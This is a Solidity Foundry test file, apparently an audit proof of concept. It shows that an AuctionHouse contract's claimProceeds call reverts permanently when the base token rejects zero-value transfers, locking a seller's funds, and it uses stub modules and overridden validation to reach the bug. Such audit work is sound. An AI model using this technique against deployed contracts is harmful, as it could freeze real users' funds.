// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*//////////////////////////////////////////////////////////////////////
                                Imports
//////////////////////////////////////////////////////////////////////*/

import "forge-std/Test.sol";

import {AuctionHouse}          from "src/AuctionHouse.sol";
import {AuctionModule}         from "src/modules/Auction.sol";
import {ICallback}             from "src/interfaces/ICallback.sol";

import {ERC20}                 from "lib/solmate/src/tokens/ERC20.sol";

/*//////////////////////////////////////////////////////////////////////
                         Test-Only Helper Contracts
//////////////////////////////////////////////////////////////////////*/
/// @notice ERC20 that reverts when `transfer`/`transferFrom` is called
///         with `amount == 0` (behaviour exhibited by e.g. USDT, USDC).
contract RevertOnZeroERC20 is ERC20 {
    error ZeroTransfer();

    constructor(string memory name_, string memory sym_)
        ERC20(name_, sym_, 18)
    {}

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert ZeroTransfer();
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount)
        public
        override
        returns (bool)
    {
        if (amount == 0) revert ZeroTransfer();
        return super.transferFrom(from, to, amount);
    }

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

/// @notice “Normal” ERC20 used as the quote-token in the test.
contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s, 18) {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

/// @notice Extremely small stub-module – only the function required by the
///         exploit (`claimProceeds`) is implemented. Everything else is left
///         out because it is never invoked by the PoC.
contract DummyAuctionModule {
    /*//////////////////////////////////////////////////////////////
                              Dummy Logic
    //////////////////////////////////////////////////////////////*/

    /// @dev Return values chosen such that the refund calculated in
    ///      AuctionHouse.claimProceeds() equals zero:
    ///      prefundingRefund = routing.funding(==0) + payoutSent_ - sold_ = 0
    function claimProceeds(uint96)
        external
        pure
        returns (uint96 purchased_, uint96 sold_, uint96 payoutSent_)
    {
        purchased_  = 0;
        sold_       = 100;
        payoutSent_ = 100;
    }
}

/*//////////////////////////////////////////////////////////////////////
                     Testable Wrapper around AuctionHouse
//////////////////////////////////////////////////////////////////////*/
/// @dev  Makes it easy to inject our stub-module and craft the minimal
///       on-chain state that triggers the bug.
contract TestableAuctionHouse is AuctionHouse {
    /*//////////////////////////////////////////////////////////////
                                Setup
    //////////////////////////////////////////////////////////////*/
    address internal immutable _dummy;

    constructor(address dummyModule)
        AuctionHouse(address(this), address(this), address(0))  // owner, protocol, permit2
    {
        _dummy = dummyModule;
    }

    /*//////////////////////////////////////////////////////////////
                        Internal Overrides (testing)
    //////////////////////////////////////////////////////////////*/
    // Skip lot-validation completely – not relevant for the PoC
    function _isLotValid(uint96) internal pure override {}

    // Force every lot to resolve to the injected dummy module
    function _getModuleForId(uint96) internal view override returns (AuctionModule) {
        return AuctionModule(_dummy);
    }

    /*//////////////////////////////////////////////////////////////
                         Test Helper Functions
    //////////////////////////////////////////////////////////////*/
    /// @notice Initialise Routing‐data for a lot so that
    ///         `claimProceeds()` can run until it reaches the bug.
    function initRouting(
        uint96 lotId,
        ERC20  baseToken,
        ERC20  quoteToken,
        address seller,
        uint96 funding
    ) external {
        // `lotRouting` lives in the Auctioneer base contract
        Routing storage r = lotRouting[lotId];
        r.baseToken   = baseToken;
        r.quoteToken  = quoteToken;
        r.seller      = seller;
        r.callbacks   = ICallback(address(0));
        r.funding     = funding;
    }
}

/*//////////////////////////////////////////////////////////////////////
                               The Exploit
//////////////////////////////////////////////////////////////////////*/
contract Exploit_ZeroAmountTransfer is Test {
    /*//////////////////////////////////////////////////////////////
                               State
    //////////////////////////////////////////////////////////////*/
    RevertOnZeroERC20   internal baseToken;
    TestToken           internal quoteToken;
    DummyAuctionModule  internal dummyMod;
    TestableAuctionHouse internal house;

    address internal constant SELLER = address(0xBEEF);
    uint96  internal constant LOT_ID = 1;

    /*//////////////////////////////////////////////////////////////
                               Setup
    //////////////////////////////////////////////////////////////*/
    function setUp() public {
        baseToken  = new RevertOnZeroERC20("Revert-On-0", "R0");
        quoteToken = new TestToken("Quote", "QT");

        dummyMod = new DummyAuctionModule();
        house    = new TestableAuctionHouse(address(dummyMod));

        // Prepare minimal routing data needed by `claimProceeds`
        house.initRouting(LOT_ID, baseToken, quoteToken, SELLER, 0);
    }

    /*//////////////////////////////////////////////////////////////
                              Vulnerability
    //////////////////////////////////////////////////////////////*/
    /// @notice Proves that `AuctionHouse.claimProceeds()` reverts
    ///         permanently when the base-token reverts on zero-value
    ///         transfers – locking the seller’s funds.
    function test_ClaimProceeds_Reverts_When_BaseToken_RevertsOnZero() public {
        // The revert bubbles up from `RevertOnZeroERC20.transfer`
        vm.expectRevert(RevertOnZeroERC20.ZeroTransfer.selector);

        vm.prank(SELLER);
        house.claimProceeds(LOT_ID, "");
    }
}